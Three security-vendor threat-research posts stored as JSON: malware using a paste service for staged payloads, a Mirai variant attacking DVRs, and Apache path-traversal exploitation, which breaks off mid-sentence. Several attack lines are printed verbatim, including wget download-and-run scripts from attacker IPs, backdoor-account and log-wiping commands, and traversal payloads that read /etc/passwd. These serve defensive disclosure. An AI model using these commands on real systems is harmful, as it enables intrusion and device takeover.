{"https://blogs.juniper.net/en-us/threat-research/new-pastebin-like-service-used-in-multiple-malware-campaigns": {"metadata": {"dateAccessed": "2021-07-27", "dateCreated": "2020-10-05", "source": "blogs.juniper.net"}, "text": "Juniper Threat Labs identified several malware campaigns that rely on a pastebin-like service for its infection chain. The domain in question is paste.nrecom.net. The attacks usually start as a phishing email and, when a user is tricked into executing the malware, it downloads the succeeding stage of the malware from paste.nrecom.net and loads it into the memory without writing to disk. Using a legitimate web-service for the malware infrastructure is not new, as we have seen APT group FIN6 using pastebin to host parts of the infection chain and Rocke using it for command and control. Although using legitimate web services is not novel, this is the first time that we have seen threat actors use paste.nrecom.net. Among the malware we have identified are AgentTesla, LimeRAT, Ransomware and Redline Stealer. What is paste.nrecom.net? Paste.nrecom has been in service since May 2014. If you are not familiar with pastebin, it is a service where you can post your code or text data with the intent of sharing it with others. Paste.nrecom does the same thing and it also offers an API that allows scripting. This is advantageous to threat actors as they can easily insert and update data programmatically. This service is powered by Stikked , which is an open-source PHP based pastebin. How do threat actors use it for malicious purposes? Because it is a text-only service, one would think that it cannot host an executable file (binary data) into it. However, binary data can be represented as a text file by simply encoding it. The common encoding method is using base64 . That is exactly what the threat actors did in this case. malicious paste encoded in base64 To add another layer of obfuscation, they encrypt the binary data with a XOR key. The following file, for example, is encrypted with XOR key, 0x02. After base64 decoding, the file is still encrypted with XOR algorithm. After all the necessary decoding and decryption, you will then see the executable file, as shown above. From September 21, 2020, we have seen several malware families taking advantage of this service and quickly ramped up. Malware Campaigns The attack usually starts with a phishing email that includes an attachment, such as a document, archive or an executable. When a user is tricked into installing the malicious attachment (first stage), it downloads the next stages from paste.nrecom.net. We have also seen malware hosting their configuration data in the same service. Agent Tesla Agent Tesla is a spyware that is capable of stealing personal data from web browsers, mail clients and FTP servers. It can also collect screenshots, videos and capture clipboard data. Recent versions of this malware are also capable of stealing personal data from VPN clients. It is being sold on the underground markets for as low as $15 and could go up to $70 depending on the additional features. Agent Tesla is among the most active malware using this pastebin-like service. Campaigns usually start with a phishing email with a malicious attachment. Based on the samples we found, these campaigns target multiple industries related to shipping, supply chain and banks. In some cases, the attachments are archives, such as .iso, .rar or .uue like below: Attachment Sha256: 9c38ab9d806417e89e3c035740421977f92a15c12f9fa776ac9665a1879e5f67 Infection Chain for 9c38ab9d806417e89e3c035740421977f92a15c12f9fa776ac9665a1879e5f67 As you can see from the chain, there are two requests to paste.nrecom because it divides the Agent Tesla payload into two. The first request is the first half of the file and the second request makes the second half. This technique makes it harder for security solutions to analyze the payload. Another sample phishing email has the attachment with Sha256: 199a98adf78de6725b49ec1202ce5713eb97b00ae66669a6d42f8e4805a0fab9 Below are email attachments and files inside some email attachments that we have found to install Agent Tesla using paste.nrecom. File Name Sha256 Emirate bank TT copy 2020-09-20 at 07.30.55.uue f8c02c3f6d22978b3c478d0fb7ad4845609b8ad4a38e0ed2a75721156a6a8e44 Inv C-22464 PO 3871.exe 27f8e739b62c685c4115f49ae146bb75271d0b8fad021436939735bf7492186b PO#150367285 SECONDO VERGANI SPA Ref#BK043383.exe 3101003430beae11fe082a07878ac2f643a64e3abd82b7b2a787a0e1fde27307 Payment Notification.uue b7cf6fb7557f435bab1b815a38b1771aea9d118192f6d184111754615e8881af bank payment copy.exe 136991b95c503e13d7ed77305a305f6f568c9d93273584d19a33014202a6ebbb Payment docs63878288882788.docx.rar 44221603cb9e19a630e35bd12a9c8bd97a9d2743a6fc5528e81db0718fc3e1b3 Attachment JOIN LEADERS PO332,pdf.exe 167139073c586fd0d7de374611f899e170fd0316463be6c65170496636b3e42d APROBACION DE TRANSFERENCIA INUSUAL REALIZADA EXITOSAMENTE.tar 0e044c8570122a280c963cac80e0140da78ee0d378cd17cab4ea6f146ce35d15 In some cases, the attached files are Office Documents that download the Agent Tesla loader. Infection chain for c66e6c6018d3e51e8b39146c6021fb51f59750b93778a063f7d591f24068c880 W3Cryptolocker Ransomware W3Cryptolocker is a relatively new ransomware. Based on our telemetry, this ransomware surfaced in July 2020. We will call this malware W3Cryptolocker, based on a string found in its code. Strings found in the binary code of this ransomware. The loader was hosted on a potentially hacked site, italake.com. Infection Chain of Ede98ae4e8afea093eae316388825527658807489e5559bff6dbf5bc5b554a2c It will encrypt all files in all drives except for files having “.xls” extension and folders having the following strings: Windows ProgramData $Recycle.bin System Volume Information It adds an extension .xls for encrypted files. After it is done encrypting each folder, it creates a “Read_Me.txt” file on each folder with the following message. Visiting the https://yip[.]su/ 2QstD5 leads you to a freshdesk support site, bit7.freshdesk.com. Other W3Cryptolocker Samples c97852b425e41d384227124d93baf6c2d3e30b52295a828b1eac41dc0df94d29 9a0af98d0b8f7eacc3fdd582bbc0d4199825e01eeb20c2a6f98023c33ece74f6 01eea2a4628c6b27a5249a08152655246871acafa657e391b73444c05097976e 9a08e87e8063b13546e464f73e87b2ca5bde9410fec4e614313e2b8a497592fa 8dfe87850bd17b4eb0169b85b75b5f104ae6b84deeb2c81fe6ae5e19685f6c66 53124033d521158771eac79ad6f489c6fdd5b25ab96712035c2ca65b3a3c5eed aac2024789ffd2bfce97d6a509136ecf7c43b18c2a83280b596e62d988cedb10 fafabdffa67883587ba1a3c29f6345a378254f720efe8c2f318a4d5acdbce373 Redline Stealer Redline Stealer is a malware that surfaced around March 2020 and it was reported to have targeted healthcare and manufacturing industries in the United States. This malware is found being advertised on forums with several pricing options starting from $100/month subscription. It has the following functionality: Browser Data Stealer Login and Passwords Cookies Autocomplete Fields Credit Cards Remote Task Functions Execute Commands Download Files Download Files and Execute RunPE (Process Injection for fileless infection) OpenLink FTP and IM client stealer File-grabber Collects information about the victim’s system The sample we found poses as a Bitcoin Miner archived into a RAR file. The archive contains an executable, MinerBitcoin.exe, that downloads the Redline Stealer payload from paste.nrecom.net. Infection Chain of Redline Stealer: Sha256: a719affc96b41b63f78d03dc3bc6b7340287d25d876e58fd1ab307169a1751dc Redline Stealer malicious functions LimeRAT LimeRAT is a remote administration trojan coded in .NET and is open source. It was a malware used to target Colombian government institutions by the APT-C-36 group. Among its many capabilities, it can be used as: Ransomware Remote Desktop Crypto Mining CryptoStealer DDOS Keylogger Password Stealer Infection Chain of 20ad344d20337f8a782135e59bc1f6e1a7999bcddc50fc1dc3b8b6645abcb91e Another sample we found is aae2e0d0792e22164b3c81d0051c5f94a293bae69e7aac5cc4ad035860dbf802. At the time of this analysis, this sample still has zero VT detections. It downloads the LimeRAT from https://paste[.]nrecom[.]net/view/raw/93a7cd20. aae2e0d0792e22164b3c81d0051c5f94a293bae69e7aac5cc4ad035860dbf802 with no VT hits Conclusion Using legitimate web-services like pastebin or paste.nrecom for malware infrastructure gives cybercriminals an advantage, as these services cannot be easily taken down due to their legitimate use. We recommend Security Operations to add paste.nrecom to potentially web services being abused for malicious purposes. It is recommended to monitor web-services like this one for suspicious content particularly binary data encoded in base64. Juniper’s Encrypted Traffic Insights capability on the SRX NGFW does detect the malicious TLS connections to paste.nrecom.net as malicious using machine learning as seen in the screenshot below for W3Cryptolocker loader. Juniper Advanced Threat Protection (ATP) detects these threats. Detection of AgentTesla Loader (Project 68234.iso) Detection of AgentTesla Loader (VESSL’ITENERARY.xlsm) Detection of W3Cryptolocker Loader (0022.exe) Detection of malicious connection to paste.nrecom using Juniper Encrypted Traffic Insights Indicators of Compromise (IOC) Domain Paste.nrecom.net 192.12.66.108 lol.thezone.vip URL http://198[.]12[.]66[.]108/v[.]exe http://lol[.]thezone[.]vip/v[.]exe http://italake[.]com/assets/css/0022[.]exe https://paste[.]nrecom[.]net/view/raw/3c3ececf https://paste[.]nrecom[.]net/view/raw/6306a51c https://paste[.]nrecom[.]net/view/raw/bfefa179 https://paste[.]nrecom[.]net/view/raw/39468747 https://paste[.]nrecom[.]net/view/raw/c230a816 https://paste[.]nrecom[.]net/view/raw/3529ec57 https://paste[.]nrecom[.]net/view/raw/7900ed08 https://paste[.]nrecom[.]net/view/raw/bd63e76f https://paste[.]nrecom[.]net/view/raw/658b9281 https://paste[.]nrecom[.]net/view/raw/b44fe71a https://paste[.]nrecom[.]net/view/raw/93a7cd20 https://paste[.]nrecom[.]net/view/raw/d8aedaf6 https://paste[.]nrecom[.]net/view/raw/91aec4e7 https://paste[.]nrecom[.]net/view/raw/4736837b https://paste[.]nrecom[.]net/view/raw/aec14685 https://paste[.]nrecom[.]net/view/raw/c7dfc858 https://paste[.]nrecom[.]net/view/raw/bebcab0a https://paste[.]nrecom[.]net/view/raw/bfbb1544 https://paste[.]nrecom[.]net/view/raw/7f41da66 https://paste[.]nrecom[.]net/view/raw/0d9233c8 https://paste[.]nrecom[.]net/view/raw/4f789f73 https://paste[.]nrecom[.]net/view/raw/6550c073 https://paste[.]nrecom[.]net/view/raw/3066146f https://paste[.]nrecom[.]net/view/raw/019f27dd https://paste[.]nrecom[.]net/view/raw/04fba6cb Sha256 9c38ab9d806417e89e3c035740421977f92a15c12f9fa776ac9665a1879e5f67 Ede98ae4e8afea093eae316388825527658807489e5559bff6dbf5bc5b554a2c cb1da05bac46d1aeb0eeec67b2249aa8f539784c4a9ff9245b4ed4a8937ccd0f 337f28a9250592d0ebc58f5a913114df82e69ef4c44243191204adfa61f9819b 8d804533708c03ed4236be70e113a419ce1c8d8a5c36baa755cb7b787f29f54f 20ad344d20337f8a782135e59bc1f6e1a7999bcddc50fc1dc3b8b6645abcb91e bc2e03ca292da305602c8755453fa87073810a6359f2ec9a0935fe3bb51ef886 4f31265917db7d9abbdf4b6378da0822158cc9b4bff1904adad63a87cfa82f2e 3d3ab28f09d5736fcd2215fb6395e7b15e6e9f1f86931b1d3d956c70879e9d33 13b630c5c157585f6abcb2fc8e3388c23a09f881c20cdeaffda291fb36a37539 a78cce9dc644987d3404335cefeca9833ea5f69a36b2da05e5a86505c862d867 29f7eb242d7ddcaacfaac36f036081abc28ba48faaaf9fca601725a6ed160637 62fa4dea77f33cfe294110457af90d2ccd0fc32f3d37c9ddf7a0457ed8f315ee 9c0b50ba7ea383bf16b25ea12a830d5c63c5c995ab2f494dc270137ecfd31701 3c940fdf850d0e6211b340564357094fa8ddb81351789bfd43465efa2e52acfd 59bf368c532ca20de17fdaaee2160451ae8c8f7cafd8d3c7adb263dd0978e918 b9e094892d6ed3b3eba5b56416d31b5ea635cf666ddf67ff4eb62475db7371ca 9b876e4ddeaf0d950860db4942d9be1507453ba1065a03672de41dfb287b2511 f8ef2da125ebd0f972969d12f28964a00954bad6e4f804bd1db8c0507e751bc9 f679912dbe6576989cd541b866f5f3a7a2423b1a6f92cc189a12fbffc42b926d 1e4b7d7868d25071db67da87392fd5dafab344a9fa6dc040f7afb0699152fc13 1a8573f9acba3f7d8863043223fb1d6ef4b52ad5bb4cdcb5e178e935b25b40e3 94b9c9154a23db8df436f4cdda225d9bd28dfae325dfe68e034462d70245fb0e a7f337587cdd0e9a1fb013da274293d207815843f778c714e75693cd2c8e5f11 afb7a097cebd29157285861e7bac37648c92243143b560772e652fa87b8aed6b e3065a6f8e49ccda273bf283c18b9344cc9ad802c1065b0fdf45cdafe92d1029 d38feef0723f730c8bb5704b4b45c8c0c324b1718b42e80b98244a7e49844331 99121c7c11bb444912d02000ce2e8a39b3e885d66889547ec8fb0c88906c22f4 6194207c32a23bac956afb47f857ebcdcb3aa37e818907e98b27acaf4b83d60f 435f9c7e3e74fa789f423e1a3c794fc8347414495a46de36e82de0e10cc0cf38 41502bc411135eb896c8a8aa7aa337ae437977473bd329ac1d0ccfa639ec4e2c 5d4b172afd897db7dddf983697c620cb1dde6341380b849f81f7606ae2073093 cb6c181823fd61558c1e6cefa9f1634d1676984316caa071c24268df493d3629 518096f15c73866783c6e10fbc9b694c41391ee6b0b3b4608ff24c3f457e21fd 904453d980dceca169497cb717731b046bbbb8c6700b90dbe46dc35c15a8fff2 8aaea85bfddaea3ec7217b5f2fa10daf0ca359f5228c3119185e7af281b42e2b 444d5257fc696b234af3311abf6985a41e6e60c66dc92dab0903cbc60156f398 e7edc16f528c9cf0455d84f412520786f31aae8f67f3f551671f576727d1d141 34a5905fd12478a0ac253f5fb1fb8e32543ea070ef3d1f84ed5e448475f385cb 9db25a250975ebce56643b75440c64705b0ecc1207d5a3d92b8f3d6060af3551 a533b2ceae875b9e14a1980d31fcd0243ef88a66371d6bcfbde7e423e0c2b610 1089bd2bc482573fc05dbea6a3c195802accedcd9ad74c6e4125a7a035c021be 398a9031f8f0eeb85169aa06340a39230beac02dc1a2a004280a1528576197ad 115127b50a0f45aabb993f8ffd5b585e063a98a17e1b687036167409cf2b0ac2 f52802d87fdaca4cc9c0ef7a6b1352163e3679272752d8ea3e7a681de99dfd43 b50d4fd8b572c3a13c4997c83e0bbbc3f7a270e75b79ec09512142f5560f61ab 2b2da9baef3c6f18ac4c4340b3107359f1113ee8ea3c097835c24546f1a3f11f f638dcb163a2568b12a9ea757335a0cc432bee92c15c77c5e80a294ad31bd792 5946308eb0248dd65c6ddc199f8bf69576b7e1dc95eb28822a265fecb1e56c86 c8ccf5c24239360035df47fef44703d7775346dbf7b1afcf78af6250b8876521 49add5e8057e45261291d45a67b60d0db5376efe9ba6873af53fc79f27243e43 d58b9d22310bf486e4301ed93191810f07cf06ca42b5252e4ded1537680579b6 3e292943cacc062b57a2b1e88340a2d0641e901470f385168b671c90eaf70e2a 3db65b267a1e41ebb307b706f561866dce2752041f482abe93f73144df9a1d4d cf2dfce39e8f0eb5af3a9d51b5559e2c9be27ea5c1ef899e76281a0ee530307f 878bc771d4c7416170ff358db124e1608f5612b8998199a95c5d60d8f940b26e b7b028faf0caeca7b7f21de532299867e142fb043d31f996c5f5a3535dea4a47 dd16f5efc0cdb995aa3f7822016ae1e2a4708d5b8b5b4a2f6477f5ef5b82e205 682fdd0b1a94ea8f92981fd6b697a5c4ff817ff6e838285655ede39107ca9ade 3a845e095d227f6318cb0dc973c5ecd2a74555435fcd735b71cd30d4a862c39c e5eab76057ff57592284f3ea66db174032c69b1808dee70c081e03771d521545 3d9e5f07897b3089600b123a50a005eab5051640661dc4575c2afc0391c97ad8 4f0bc389fcd575a732907732c223219ab0ad44571ca6f83f99358bb9e7467839 f1b40766fbaeb0248b3e629b1904156e3966d2b862d030a8218236904e8cd32f 52f124a478c562251459cacc60b7afa952a8c02df7342c1a951502307ba7b33f 3cc7000f6f2bf315a4fc3fb0ef9035f8683d4660648e23cb178656eae79b2dc5 63cd03b7e7013b0a7bac695d4fb9b5c5c7e9c556eb6eab0a9ec359049fb2621c 022d911560f38d5165ea4196ac74a141531d3e244cdc9be895e539f7143a7bbb 39ba64584fb99652e9d2c05b4afdf139317f5f2a052611b989257047cc12db74 4784f1dbfcafcef10bdfd6c2021b1e74a826917715fd84a91f610a8b6a3bdc4f 7fe854ce78e7ab7cafcc299b4f2a4ee82cc366d47f9a8961727365e45688bb4c ac97cd95119446e96dd0bc35a4b9dc67f4ef2853e298dc145c7588807022d808 0e044c8570122a280c963cac80e0140da78ee0d378cd17cab4ea6f146ce35d15 6e960e703df3fdea6667d9c5b671e3efc05c692eb6875edc74c5ccc8ade52ac7 c8abcedb3ec20f7ab5d9b98cc32f03b318eba61f344e0537e4d4de673422c6b1 b4e0b3b783072b5266988f11bd5af2235b432619a42466fea81a35cb5edc4eea 23528e75315abed2f7a86fad26036ef1626311c3838153cb8a96bd938f0055ac 0374033592ba3bfa76d5046af2eaf4506166b157aae2c5a396c827b36d4738ca 6462c93c7a2cbad27bd1cd418bed36078860fd7f1399b477991fe3c71c0d7a8c dcbfc3cecf75ec77de3ac314ca911af1d778e5c432df4cda146c02aa9ae84c47 fc4b29f54e0b3ed0493ba85310a2665ab47e5143f3cb3ce09686f0560dd1ed04 27f8e739b62c685c4115f49ae146bb75271d0b8fad021436939735bf7492186b 28b5ab14ad007650aa5e45f5090119a758eb45f893e400e53e5ea13ac2e5b38e 115127b50a0f45aabb993f8ffd5b585e063a98a17e1b687036167409cf2b0ac2 f52802d87fdaca4cc9c0ef7a6b1352163e3679272752d8ea3e7a681de99dfd43 b50d4fd8b572c3a13c4997c83e0bbbc3f7a270e75b79ec09512142f5560f61ab 2b2da9baef3c6f18ac4c4340b3107359f1113ee8ea3c097835c24546f1a3f11f f638dcb163a2568b12a9ea757335a0cc432bee92c15c77c5e80a294ad31bd792 5946308eb0248dd65c6ddc199f8bf69576b7e1dc95eb28822a265fecb1e56c86 c8ccf5c24239360035df47fef44703d7775346dbf7b1afcf78af6250b8876521 49add5e8057e45261291d45a67b60d0db5376efe9ba6873af53fc79f27243e43 d58b9d22310bf486e4301ed93191810f07cf06ca42b5252e4ded1537680579b6 3e292943cacc062b57a2b1e88340a2d0641e901470f385168b671c90eaf70e2a 3db65b267a1e41ebb307b706f561866dce2752041f482abe93f73144df9a1d4d cf2dfce39e8f0eb5af3a9d51b5559e2c9be27ea5c1ef899e76281a0ee530307f 878bc771d4c7416170ff358db124e1608f5612b8998199a95c5d60d8f940b26e b7b028faf0caeca7b7f21de532299867e142fb043d31f996c5f5a3535dea4a47 dd16f5efc0cdb995aa3f7822016ae1e2a4708d5b8b5b4a2f6477f5ef5b82e205 682fdd0b1a94ea8f92981fd6b697a5c4ff817ff6e838285655ede39107ca9ade 3a845e095d227f6318cb0dc973c5ecd2a74555435fcd735b71cd30d4a862c39c e5eab76057ff57592284f3ea66db174032c69b1808dee70c081e03771d521545 3d9e5f07897b3089600b123a50a005eab5051640661dc4575c2afc0391c97ad8 4f0bc389fcd575a732907732c223219ab0ad44571ca6f83f99358bb9e7467839 f1b40766fbaeb0248b3e629b1904156e3966d2b862d030a8218236904e8cd32f 52f124a478c562251459cacc60b7afa952a8c02df7342c1a951502307ba7b33f 3cc7000f6f2bf315a4fc3fb0ef9035f8683d4660648e23cb178656eae79b2dc5 63cd03b7e7013b0a7bac695d4fb9b5c5c7e9c556eb6eab0a9ec359049fb2621c 022d911560f38d5165ea4196ac74a141531d3e244cdc9be895e539f7143a7bbb 39ba64584fb99652e9d2c05b4afdf139317f5f2a052611b989257047cc12db74 4784f1dbfcafcef10bdfd6c2021b1e74a826917715fd84a91f610a8b6a3bdc4f 7fe854ce78e7ab7cafcc299b4f2a4ee82cc366d47f9a8961727365e45688bb4c ac97cd95119446e96dd0bc35a4b9dc67f4ef2853e298dc145c7588807022d808 0e044c8570122a280c963cac80e0140da78ee0d378cd17cab4ea6f146ce35d15 6e960e703df3fdea6667d9c5b671e3efc05c692eb6875edc74c5ccc8ade52ac7 c8abcedb3ec20f7ab5d9b98cc32f03b318eba61f344e0537e4d4de673422c6b1 b4e0b3b783072b5266988f11bd5af2235b432619a42466fea81a35cb5edc4eea 23528e75315abed2f7a86fad26036ef1626311c3838153cb8a96bd938f0055ac 0374033592ba3bfa76d5046af2eaf4506166b157aae2c5a396c827b36d4738ca 6462c93c7a2cbad27bd1cd418bed36078860fd7f1399b477991fe3c71c0d7a8c dcbfc3cecf75ec77de3ac314ca911af1d778e5c432df4cda146c02aa9ae84c47 fc4b29f54e0b3ed0493ba85310a2665ab47e5143f3cb3ce09686f0560dd1ed04 27f8e739b62c685c4115f49ae146bb75271d0b8fad021436939735bf7492186b 28b5ab14ad007650aa5e45f5090119a758eb45f893e400e53e5ea13ac2e5b38e"}}
{"https://blogs.juniper.net/en-us/security/priority-threat-actors-adopt-mirai-source-code": {"metadata": {"dateAccessed": "2021-07-27", "dateCreated": "2020-10-01", "source": "blogs.juniper.net"}, "text": "Mirai has become such a common discovery in the wild that it is beginning to be disregarded as white noise, played off as a simple attack that should be readily stopped by common security products. This is dangerous thinking and will lull security professionals and executives into complacency. Juniper Threat Labs has discovered a new attack, based off of Mirai from an attacker who originally appeared to be calling themselves “Priority”. In later versions, this attacker took that out of the code and started deploying a more advanced version of Mirai. This attacker appears to be amateur, as we will explore more later on. Note that this could be a ruse to mask a more sophisticated attacker. The original malware used by the attacker is based off the Demonbot variant of Mirai and focuses on the Hadoop YARN exploit . The second variant the attacker used is based off the variant of Mirai developed by Scarface.  While Demonbot focuses on attacking Hadoop, the developer Scarface attempted to make the bot more “user friendly” and focused on Internet of Things devices. Scarface is known to make his code more readily available to novice actors, but has the reputation of including backdoors in the code to allow him access to victims of others. While the Scarface variant is considerably more advanced than Demonbot, the attacker is still only attempting the DVR exploit on port 60001. This Priority attacker has been active from September 10, 2020 up until the publishing of this blog. They are attacking ports 5500, 5501, 5502, 5050 and 60001 with a simple command of “GET /shell?cd%20/tmp;%20wget%20http://45(.)13.58.4/TPJ.sh;”. The initial attacks started on port 60001, before progressing into additional ports. This attack leverages the MVPower DVR Shell Unauthenticated Command Execution , reported by Unit 42 as part of the Omni Botnet variant of Mirai . What is interesting about this attacker is Juniper Threat Labs has not witnessed them using any additional exploits, perhaps showing again the attackers immaturity in the attack methodology. In contrast, we see the majority of attackers using Mirai variants running three to seven different vulnerabilities against multiple protocols or devices. This attacker has limited their attacks to a single exploit and, while spread over a few ports, the primary objective is attacking port 60001. The other ports appear more like a diversion, leading us to believe that the attacker has a specific objective in mind. All the attacks originated from an IP address (128(.)199.15.87) owned by Digital Ocean, out of their Santa Clara data center. Digital Ocean is a well-known VPS provider that allows for quick setup and destruction of Virtual Private Servers. These servers are a mainstay for hackers to pop-up launch their attacks and then destroy their servers at low cost. That attacker progressed to a new server at 64(.)227.97.145, a different server also based out of the Digital Ocean Santa Clara data center. The JAWS DVR software has been under attack with a steady increase since October 2019 and peaking in June 2020. In the past few months, SANS saw a steady decline in the activity of port 60001. Meanwhile, we at Juniper Threat Labs have seen a significant increase since July 2020, peaking at 733 daily attacks on the July 18. Attacks for port 5500, 5501, 5502 and 5050 do not seem to be targeting a specific vulnerability. The file downloaded was a simple shell script with the following contents. The IP address of the malware hosting server 45(.)13.58.4 is Heficed, another VPS provider but less well-known than Digital Ocean. What’s unique about this attack is that the first file variants of dlr.* (x86, mips, mpls, arm(all) and ppc are all packed with UPX, while m68k, sh4 and spc appear to not be packed at all. The strings in the files that show this to be a variant of Mirai are: “NeTiS and Thisity” and “FoReHeAd We BiG L33T HaxErS” Then, in future versions, there appears to be some significant changes specifically in claiming the system for “Priority” Server Infected! System Now Owned By Priority 54.39.36.160 Proximity-Killers These Mirai variants are identified by Juniper ATP Cloud as Mirai.0 The IP address referenced in the code is (54(.)39.36.160) also hosted at another VPS known as OVH Hosting Inc. Open ports on this IP are 21/tcp open ftp 22/tcp open ssh 80/tcp open http 445/tcp filtered microsoft-ds 3306/tcp open mysql 55555/tcp open unknown The web interface displays an Apache 2 Test page for CentOS. While this attacker does not appear to be as sophisticated as the developers of Mirai and Hoaxcall, they do appear to have a basic understanding of rudimentary attacks and modifying malware code to suit their needs. They understand the basics of anonymity, but their desire to “identify” themselves and “claim” their territory is reminiscent of hackers of the ‘80s and ‘90s. The attacker has most recently switched to a new attacking IP of 149(.)3.170.237 with the command originating from both of the IPs used in previous attacks. GET /shell?cd%20/tmp;%20wget%20http://149(.)3.170.237/Masked.sh;%20chmod%20777%20*;%20sh%20Masked.sh;%20rm%20-rf%20*;%20history%20-c HTTP/1.1 The contents of the new shell script point to the same server located on Seychelles Island in the Indian Ocean. #!/bin/bash cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http:// 149 (.) 3 . 170 . 237 /Masked.mips; chmod +x Masked.mips; ./Masked.mips; rm -rf Masked.mips cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http:// 149 (.) 3 . 170 . 237 /Masked.mpsl; chmod +x Masked.mpsl; ./Masked.mpsl; rm -rf Masked.mpsl cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http:// 149 (.) 3 . 170 . 237 /Masked.sh4; chmod +x Masked.sh4; ./Masked.sh4; rm -rf Masked.sh4 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http:// 149 (.) 3 . 170 . 237 /Masked.x86; chmod +x Masked.x86; ./Masked.x86; rm -rf Masked.x86 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http:// 149 (.) 3 . 170 . 237 /Masked.arm6; chmod +x Masked.arm6; ./Masked.arm6; rm -rf Masked.arm6 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http:// 149 (.) 3 . 170 . 237 /Masked.i686; chmod +x Masked.i686; ./Masked.i686; rm -rf Masked.i686 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http:// 149 (.) 3 . 170 . 237 /Masked.ppc; chmod +x Masked.ppc; ./Masked.ppc; rm -rf Masked.ppc cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http:// 149 (.) 3 . 170 . 237 /Masked.i586; chmod +x Masked.i586; ./Masked.i586; rm -rf Masked.i586 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http:// 149 (.) 3 . 170 . 237 /Masked.m68k; chmod +x Masked.m68k; ./Masked.m68k; rm -rf Masked.m68k cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http:// 149 (.) 3 . 170 . 237 /Masked.sparc; chmod +x Masked.sparc; ./Masked.sparc; rm -rf Masked.sparc cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http:// 149 (.) 3 . 170 . 237 /Masked.arm4; chmod +x Masked.arm4; ./Masked.arm4; rm -rf Masked.arm4 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http:// 149 (.) 3 . 170 . 237 /Masked.arm5; chmod +x Masked.arm5; ./Masked.arm5; rm -rf Masked.arm5 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http:// 149 (.) 3 . 170 . 237 /Masked.arm7; chmod +x Masked.arm7; ./Masked.arm7; rm -rf Masked.arm7 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http:// 149 (.) 3 . 170 . 237 /Masked.ppc440fp; chmod +x Masked.ppc440fp; ./Masked.ppc440fp; rm -rf Masked.ppc440fp The following strings taken from the second wave of this attacker indicate this source code was taken from the Yakuza/Scarface variant of Mirai. (null) Billy BobBot/1.0 (+http://www. billy bobbot.com/crawler/) YakuzaBotnet Scarface1337 In the strings we can see that attacker inserting a user into /etc/passwd and /etc/shadow wwget -q –delete-after http://nexon-nx.ga/iplogger/?id 443011503 eecho system:x:0:500::/:/bin/bash >> /etc/passwd eecho system:’$6$ZPptHtmp$q9o5eFjUAh.MPmnHJbkuSNggDaq.A00dRgOBAW6gh7Uv7i/dOYD04.xMHQHtyhnkcMiYCrI6aB9KC4Lv.d3rx/:16601:0:99999:7:::’ >> /etc/shadow rrm -rf /var/log/* &> /dev/null Juniper’s ATP Cloud identifies it as Mirai variant [Trojan.Mirai.6981169]. As we continue to see more and more distribution of malware code, we will see a wider spread of attackers with limited skill using exploits and code bases that they would normally not have the capabilities of developing. These attackers are able to use search engines and browse Github to obtain the source code and research how to make simple modifications and obfuscate their malware to appear more adept. Information Security professionals will continue to see Mirai for the foreseeable future and should not discount any “attacks” as trivial."}}
{"https://blogs.juniper.net/en-us/threat-research/apache-http-server-cve-2021-42013-and-cve-2021-41773-exploited": {"metadata": {"dateAccessed": "2021-11-21", "dateCreated": "2021-10-22", "source": "blogs.juniper.net"}, "text": "Juniper Threat Labs has been seeing on-going attacks targeting Apache http servers. On October 4, the Apache Software Foundation disclosed CVE-2021-41773 , a path traversal 0- day vulnerability with reports of it being exploited in-the wild. Within one day, several proofs-of-concept to exploit the vulnerability surfaced online, that also included an unauthenticated remote code execution. Along with these developments, we started seeing active exploitation of this vulnerability in our telemetry beginning on October 6 . On October 7, CVE-2021-42013 published as patch released by Apache for CVE-2021-41773, was bypassed and several proofs-of-concept to exploit it surfaced online. Juniper Threat Labs is still seeing exploitation activity coming from multiple sources. Most of the exploitations are targeted toward two specific paths : /etc/passwd and /bin/sh . Below are a few examples of common requests captured in our telemetry. CVE-2021-41773 Attacks CVE-2021-42013 Attacks Let’s examine how these vulnerabilities can be exploited . Vulnerability Details CVE-2021-41773 is a directory traversal vulnerability that was introduced as a result of a recent change to path normalization designed to improve performance in the URL validation in Apache http server 2.4.49. It was found that if files outside the directories were not protected by the default configuration, “ require all denied”, the URL validation could be bypassed by the encoding character ‘.’. It was also verified that the vulnerability could be used for remote code execution if mod_cgi is enabled. PoCs that surfaced online used multiple variants to perform evasion for path traversal: /.%2e/.%2e/.%2e/ /.%2e%2f.%2e%2f that decodes to: /../../ /.%2e/%2e%2e/ that decodes to: /../../ On October 7 , CVE-2021-42013 was reported. It was observed that the patch rolled out for CVE-2021-41773 in Apache http server 2.4.50 was insufficient. The attackers could map the URLs to files outside the directories that can be configured by alias-like directives. If these files and directories are not protected by the default configuration “ require all denied” , it could lead to code execution. Inside Alias.conf Apache http server version 2.4.51 was released to mitigate these flaws. These vulnerabilities affect only Apache web servers running on version 2.4.49 and 2.4.50. Older versions are unaffected by this vulnerability. Exploitation Juniper Threat Labs, set up Apache http server 2.4.49 to simulate the attack scenario. Below is the vulnerable configuration: Vulnerable: <Directory /> Require all granted </Directory> NOT vulnerable (** DEFAULT **) : <Directory /> Require all denied </Directory> Vulnerable config in httpd.conf We can check the directory traversal with this one-liner curl command: curl -v –path-as-is http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd Contents of /etc/passwd retrieved Payloads can be modified to view other files also. GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/os-release This issue was fixed in Apache http server version 2.4.50 but was again exploited using double encoding technique. Contents of /etc/passwd retrieved via double encoding Path Traversal to Remote Code Execution (RCE) A remote unauthenticated user can create a specially crafted request with malicious code embedded in it that can lead to directory traversal and remote code execution. To achieve RCE, there are some pre-requisites. RCE is possible on the server only if mod_cgi is enabled. Mod_cgi is disabled in the default Apache http server configuration. Target 